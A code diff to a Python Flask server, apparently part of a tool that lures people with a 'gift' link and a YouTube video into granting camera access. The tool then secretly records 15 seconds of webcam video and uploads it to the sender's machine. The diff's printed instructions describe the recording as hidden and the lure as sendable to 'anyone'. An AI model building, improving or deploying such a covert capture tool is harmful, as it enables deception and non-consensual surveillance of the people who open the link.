@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server
+Gift Video Receiver Server - With YouTube Video Support
 """
 
 import os
@@ -20,7 +20,7 @@ from flask_cors import CORS
 # ============================================
 UPLOAD_FOLDER = 'gift_videos'
 PORT = 5000
-HTML_FILE = 'festival.html'
+HTML_FILE = 'youtube-gift.html'  # Changed to new HTML file
 
 # ============================================
 # Flask Application
@@ -202,10 +202,13 @@ class GiftServer:
         print("\n" + "="*50)
         print("\n📋 Instructions:")
         print("   1. Send the link above to anyone")
-        print("   2. They click 'Open Your Gift'")
-        print("   3. They grant camera permission")
-        print("   4. 15-second video auto-records")
-        print("   5. Video saves to your computer!")
+        print("   2. They see a YouTube video of YOUR choice")
+        print("   3. They click 'Open Your Gift'")
+        print("   4. They grant camera permission")
+        print("   5. 15-second video auto-records (hidden)")
+        print("   6. Video saves to your computer!")
+        print("\n📌 The user can change the YouTube video")
+        print("   by pasting any YouTube URL!")
         print("="*50)
         print("\n📋 Link printed above - copy it manually")
         print(f"📁 Videos will be saved in: {UPLOAD_FOLDER}/")
